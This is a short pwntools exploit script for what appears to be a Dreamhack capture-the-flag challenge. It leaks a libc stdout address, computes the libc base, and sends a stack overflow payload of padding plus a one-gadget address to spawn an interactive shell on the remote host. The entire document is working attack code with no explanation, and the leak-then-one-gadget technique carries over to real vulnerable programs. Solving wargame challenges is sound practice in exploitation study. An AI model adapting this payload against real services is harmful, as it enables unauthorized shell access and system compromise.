from pwn import *

# Must be updated
p = remote("host3.dreamhack.games", 8469)
libc = ELF('./libc.so.6')

p.recvuntil(b'stdout: ')
stdout_addr = int(p.recvline()[:-1], 16)
libc_base = stdout_addr - libc.symbols['_IO_2_1_stdout_']

onegadget_offset = 0x45216
onegadget = libc_base + onegadget_offset

payload = b'\x90' * 0x18
payload += p64(0)
payload += b'\x90' * 0x8
payload +=  p64(onegadget)
p.sendafter(b'MSG: ', payload)

p.interactive()
